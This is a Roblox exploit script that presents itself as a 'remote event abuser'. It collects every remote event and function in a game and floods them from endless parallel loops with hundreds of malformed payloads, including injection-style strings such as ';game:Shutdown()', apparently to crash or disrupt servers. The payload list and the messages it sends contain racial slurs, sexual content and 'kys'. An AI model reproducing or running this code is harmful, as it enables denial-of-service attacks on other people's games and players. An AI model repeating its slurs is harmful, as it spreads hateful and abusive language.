--[[  
    tatrolvehilexx herzamanyerde 
    Discord: https://discord.gg/tatrollvehilexx
    made by V0C0N1337 
]]--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local lp = Players.LocalPlayer


local function getAllRemotes()
    local remotes = {}
    local function scan(obj)
        for _,v in ipairs(obj:GetDescendants()) do
            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                table.insert(remotes,v)
            end
        end
    end
    scan(ReplicatedStorage)
    scan(game:GetService("Workspace"))
    scan(game:GetService("Players"))
    scan(game:GetService("StarterGui"))
    scan(game:GetService("Lighting"))
    if getgc then
        for _,v in next, getgc(true) do
            if typeof(v)=="Instance" and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
                table.insert(remotes,v)
            end
        end
    end
    local seen, final = {}, {}
    for _,r in ipairs(remotes) do
        if not seen[r] then
            table.insert(final, r)
            seen[r]=true
        end
    end
    return final
end


local function randomString(len)
    local charset = {}
    for i = 48, 57 do table.insert(charset, string.char(i)) end
    for i = 65, 90 do table.insert(charset, string.char(i)) end
    for i = 97, 122 do table.insert(charset, string.char(i)) end
    local str = ""
    for i = 1, len do
        str = str .. charset[math.random(1, #charset)]
    end
    return str
end

local payloads = {
    true,false,nil,0,1,-1,math.huge,-math.huge,math.pi,math.random(),tick(),os.time(),os.clock(),
    "vocon fucked your game","V0C0N1337","pornhub","REMOTE SEX","fuck niggerz","kys skido",
    string.rep("X",100),string.rep("A",500),string.rep("B",1000),
    {1,2,3},{a=1,b=2,c=3},{lp},{Enum.Material.Neon,Enum.Material.Fabric},{{},{},{1,2,3}},
    function() return "V0C0NBESTLUACODERFR" end,coroutine.create(function() end),newproxy and newproxy(true) or {},
    workspace,lp,game,game:GetService("Workspace"),game:GetService("Players"),game:GetService("Lighting"),
    Enum.Material.Neon,Enum.KeyCode.Space,Enum.Font.SourceSans,Enum.UserInputType.Touch,
    {nil,true,lp,"NIGGERS",Enum.Material.Fabric,123,math.huge},
    {{"A","B"},{function() end,coroutine.create(function() end)},math.random(1,99999),Enum.KeyCode.F},
    ";while true do end",";require(Workspace)();",";game:Shutdown()", "KILL_ALL_NIGGRRS", "FUCK SKIDS",
    9999999,-9999999,1337,420,69,0/0,1/0,-1/0,2^31-1,-2^31,
    Instance.new("Part"),Instance.new("Model"),Instance.new("Folder"),
    {math.random(-9999999,9999999),string.rep("voconbest",math.random(5,100)),Enum.Material:GetEnumItems()[math.random(1,#Enum.Material:GetEnumItems())]},
    tostring(math.random()),tostring(os.time()),tostring(lp.UserId),lp.Name,
    {{{{{{{V0C0N1337=true}}}}}}},{{{{{{{1,2,3,4,5}}}}}}},
    "bypass","fe_bypass","sex withniggers","vocon is harkinian group?!","remote_sex",
}
while #payloads < 300 do
    local t = {}
    for i=1,math.random(1,9) do
        local v
        if i%7==0 then v = function() return "SAFE" end
        elseif i%6==0 then v = string.rep("IM ABOUT CUMM",math.random(10,90))
        elseif i%5==0 then v = math.random(-99999999,99999999)
        elseif i%4==0 then v = Enum.Material:GetEnumItems()[math.random(1,#Enum.Material:GetEnumItems())]
        elseif i%3==0 then v = Enum.KeyCode:GetEnumItems()[math.random(1,#Enum.KeyCode:GetEnumItems())]
        elseif i%2==0 then v = tostring(math.random())
        else v = nil end
        table.insert(t,v)
    end
    table.insert(payloads, t)
end


local function generateArgs(i)
    local args = {}
    table.insert(args, payloads[i])
    if i%8==1 then table.insert(args, randomString(30)) end
    if i%8==2 then table.insert(args, Vector3.new(math.random(-1e6,1e6),math.random(-1e6,1e6),math.random(-1e6,1e6))) end
    if i%8==3 then table.insert(args, {math.huge, math.pi, randomString(32)}) end
    if i%8==4 then table.insert(args, {["SAFE"]="got fe bypass hax"}) end
    if i%8==5 then table.insert(args, "cumming on girls") end
    if i%8==6 then table.insert(args, math.random(-999999,999999)) end
    return args
end


local function attackAnyRemote(rmt)
    for t = 1, 4 do
        spawn(function()
            while true do
                for i=1,#payloads do
                    pcall(function()
                        if rmt:IsA("RemoteEvent") then
                            rmt:FireServer(unpack(generateArgs(i)))
                            if i%21==0 then
                                rmt:FireServer("V0C0N1337fuckedyourgame","DIE",randomString(10),math.huge,true,{lp,workspace,math.random()},Enum.Material.Neon)
                            end
                        elseif rmt:IsA("RemoteFunction") then
                            rmt:InvokeServer(unpack(generateArgs(i)))
                            if i%21==0 then
                                rmt:InvokeServer("ifyoureseethis yougotfebypassnigger","pornstars","GNAA MEMBERV0C0NFUCKEDYOURGAMECUMMING",math.random(),{lp,Enum.Material.Neon})
                            end
                        end
                    end)
                    task.wait(0.024)
                end
                wait(0.11)
            end
        end)
    end
end


local gui = Instance.new("ScreenGui")
gui.Name = "UNIVERSAL_REMOTE_ATTACKER_GUI"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame",gui)
frame.Size = UDim2.new(0,320,0,180)
frame.Position = UDim2.new(0.5,-160,0.6,-90)
frame.BackgroundColor3 = Color3.fromRGB(41, 60, 82)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel",frame)
title.Size = UDim2.new(1,0,0,32)
title.Text = "remote event abuser"
title.TextColor3 = Color3.fromRGB(0,255,210)
title.BackgroundTransparency = 1
title.Font = Enum.Font.Code
title.TextSize = 15

local btn = Instance.new("TextButton",frame)
btn.Size = UDim2.new(1,-20,0,44)
btn.Position = UDim2.new(0,10,0,52)
btn.Text = "attack"
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.BackgroundColor3 = Color3.fromRGB(40,60,110)
btn.Font = Enum.Font.SourceSansSemibold
btn.TextSize = 18
btn.AutoButtonColor = true

local credit = Instance.new("TextLabel",frame)
credit.Size = UDim2.new(1,0,0,20)
credit.Position = UDim2.new(0,0,1,-24)
credit.Text = "V0C01337 | https://discord.gg/tatrollvehilexx"
credit.BackgroundTransparency = 1
credit.TextColor3 = Color3.fromRGB(0,255,210)
credit.Font = Enum.Font.Code
credit.TextSize = 14

gui.Parent = CoreGui

local attacking = false
btn.MouseButton1Click:Connect(function()
    if attacking then return end
    attacking = true
    btn.Text = "attacking..."
    local remotes = getAllRemotes()
    if #remotes > 0 then
        for _,rmt in ipairs(remotes) do
            attackAnyRemote(rmt)
        end
        title.Text = "remote abuse active"
    else
        title.Text = "No Remotes Found!"
    end
end)

frame.InputBegan:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.Touch or input.UserInputType==Enum.UserInputType.MouseButton1 then
        local start = tick()
        input.Changed:Connect(function()
            if input.UserInputState==Enum.UserInputState.End and tick()-start>1.1 then
                gui:Destroy()
            end
        end)
    end
end)

print(">>> V0C0N1337 HERE")
